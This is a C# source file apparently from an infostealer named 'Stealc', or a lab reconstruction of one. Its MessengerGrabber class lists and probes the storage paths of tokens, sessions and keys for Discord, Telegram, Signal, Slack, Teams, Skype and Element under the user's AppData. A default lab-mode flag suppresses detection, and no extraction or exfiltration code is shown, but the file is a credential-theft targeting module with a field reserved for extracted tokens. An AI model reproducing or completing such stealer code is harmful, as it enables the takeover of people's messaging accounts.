namespace Stealc.Grabber.Grabbers;

public sealed class MessengerGrabber
{
    private static readonly (string App, string RelPath, string TokenType)[] Targets =
    [
        ("Discord",          @"discord\Local Storage\leveldb",      "token"),
        ("Discord Canary",   @"discordcanary\Local Storage\leveldb","token"),
        ("Discord PTB",      @"discordptb\Local Storage\leveldb",   "token"),
        ("Telegram Desktop", @"Telegram Desktop\tdata",              "session"),
        ("Signal",           @"Signal\config.json",                   "key"),
        ("Skype",            @"Microsoft\Skype for Desktop\Local Storage\leveldb", "token"),
        ("Slack",            @"Slack\Local Storage\leveldb",        "token"),
        ("Microsoft Teams",  @"Microsoft\Teams\Local Storage\leveldb", "token"),
        ("Element",          @"Element\Local Storage\leveldb",      "token"),
    ];

    private readonly bool _labMode;
    public MessengerGrabber(bool labMode = true) => _labMode = labMode;

    public List<MessengerProfile> Scan()
    {
        var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        return Targets.Select(t => new MessengerProfile
        {
            AppName = t.App,
            DataPath = Path.Combine(roaming, t.RelPath),
            TokenType = t.TokenType,
            Found = !_labMode && Directory.Exists(Path.Combine(roaming, t.RelPath))
        }).ToList();
    }
}

public sealed class MessengerProfile
{
    public required string AppName { get; init; }
    public required string DataPath { get; init; }
    public required string TokenType { get; init; }
    public bool Found { get; init; }
    public string? ExtractedToken { get; set; }
}
